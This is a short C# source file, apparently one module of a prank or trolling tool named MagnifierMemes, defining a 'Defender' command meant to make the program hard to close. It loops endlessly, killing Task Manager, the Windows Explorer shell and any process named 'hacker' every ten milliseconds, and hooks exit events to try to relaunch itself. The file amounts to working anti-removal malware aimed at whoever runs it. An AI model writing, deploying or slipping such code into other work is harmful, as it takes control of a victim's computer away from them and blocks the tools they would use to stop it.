#region

using System;
using System.Diagnostics;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;

#endregion

namespace MagnifierMemes.Memes
{
    [Meme("defend", "Makes harder to close console")]
    public class Defender : IMeme
    {
        /// <inheritdoc />
        public async Task Execute()
        {
            Process.GetCurrentProcess().Exited += OnExited;
            AppDomain.CurrentDomain.ProcessExit += OnExited;
            Application.ApplicationExit += OnExited;

            while (true)
            {
                var proc = Process.GetProcessesByName("taskmgr");
                var proc2 = Process.GetProcessesByName("explorer");
                var proc3 = Process.GetProcessesByName("hacker");

                var p = proc.Concat(proc2).Concat(proc3).ToList();

                if (p.Count != 0)
                    foreach (var process in p)
                        try
                        {
                            process.Kill();
                        }
                        catch
                        {
                        }

                await Task.Delay(10);
            }
        }

        private void OnExited(object sender, EventArgs e)
        {
            Process.Start(Process.GetCurrentProcess().StartInfo);
        }
    }
}